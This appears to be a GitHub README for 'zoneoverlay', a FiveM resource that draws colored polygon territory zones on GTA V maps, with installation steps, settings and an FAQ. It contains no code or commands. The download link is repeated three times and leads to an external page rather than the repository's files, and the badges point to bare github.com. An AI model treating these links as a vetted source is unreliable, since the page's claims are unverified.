# zoneoverlay - FiveM Territory Overlay Utility

> **Build and show colored territory overlays on the GTA V minimap and pause map from inside FiveM, with a built-in editor.**

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-FiveM-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/halldaniel1997/zoneoverlay-polygon-zone-ui?style=flat-square)](https://github.com/halldaniel1997/zoneoverlay-polygon-zone-ui)

---

<p align="center">
  <a href="https://halldaniel1997.github.io/zoneoverlay-polygon-zone-ui/">
    <img src="https://img.shields.io/badge/Download-zoneoverlay%20Script-brightgreen?style=for-the-badge" alt="Download zoneoverlay Script">
  </a>
</p>

> **[Download zoneoverlay](https://halldaniel1997.github.io/zoneoverlay-polygon-zone-ui/)**

---

[Download Latest Build](https://halldaniel1997.github.io/zoneoverlay-polygon-zone-ui/)

---

## What It Does

zoneoverlay is a compact FiveM resource for drawing territory-style colored regions on both the GTA V minimap and the full pause map. Rather than depending on fixed artwork or offline editing workflows, it lets you create polygon-based zones directly in the game world through a dedicated creation interface. Every zone is drawn at runtime with its own color, which makes it practical for districts, gang areas, event zones, or any custom area your server needs.

This release is centered on reliability and straightforward operation. Zone definitions are kept in JSON, synchronized automatically for all connected players, and exposed through simple export functions so other resources can read them. Because the creator is built into the game, you do not need separate tools or config editors - load in, open the panel, and start placing zones.

---

## Key Features

- **Polygon-based zones** - Create free-form shapes instead of being limited to circles or rectangles.
- **Built-in editor panel** - Add, modify, recolor, and remove zones while you are in-game.
- **JSON storage with automatic sync** - Zone state is saved and distributed to every player without manual steps.
- **Exports for integration** - Make zone data available to other scripts through easy export functions.
- **On-demand texture creation** - Overlays are produced at runtime, so there is no need for external image assets.
- **Minimap plus pause map coverage** - Your zones show up on the corner minimap as well as the full map screen.

---

## Installation

1. Download the latest build from the link above.
2. Copy the `zoneoverlay` folder into the `resources` directory of your FiveM server.
3. Add `ensure zoneoverlay` to your server configuration file.
4. Restart the server or start the resource manually.

No extra dependencies or outside utilities are required. After startup, the script stays out of the way until you open the creator panel.

---

## Configuration

| Setting | Default | Description |
|---------|---------|-------------|
| `openCreatorKey` | `F6` | Key to open the in-game zone creator panel. |
| `defaultZoneColor` | `#FF0000` | Default color for new zones (hex format). |
| `syncInterval` | `5000` | Milliseconds between auto-sync broadcasts to all players. |
| `maxVertices` | `32` | Maximum number of points allowed per polygon zone. |

These values can be adjusted in the script's configuration file before starting the resource.

---

## Compatibility

- **Platform:** FiveM (standalone server)
- **Game:** Grand Theft Auto V (any version supported by FiveM)
- **Multiplayer:** Works in all game modes; zones are visible to all players with the resource loaded.
- **Limitations:** Polygon editing is only available through the in-game creator panel. No external file import is supported at this time.

---

## FAQ

**How do I get zoneoverlay running on my server?**  
Download the latest release, place the folder in your server's resources, add `ensure zoneoverlay` to your config, and restart.

**What is the process for upgrading?**  
Swap out the current `zoneoverlay` folder for the new one and restart the resource. Your saved zones will stay intact as long as the JSON data file is kept.

**Can the creator panel hotkey be changed?**  
Yes. Update `openCreatorKey` in the configuration file to any valid key name.

**Will it work with other map or UI resources?**  
zoneoverlay draws its overlays independently and usually coexists with other map changes. Issues can still happen if another script touches the same map rendering functions.

**Where does zoneoverlay keep zone data?**  
All zone information is written to a JSON file inside the resource directory. The file is created automatically and updated as you use the creator panel.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
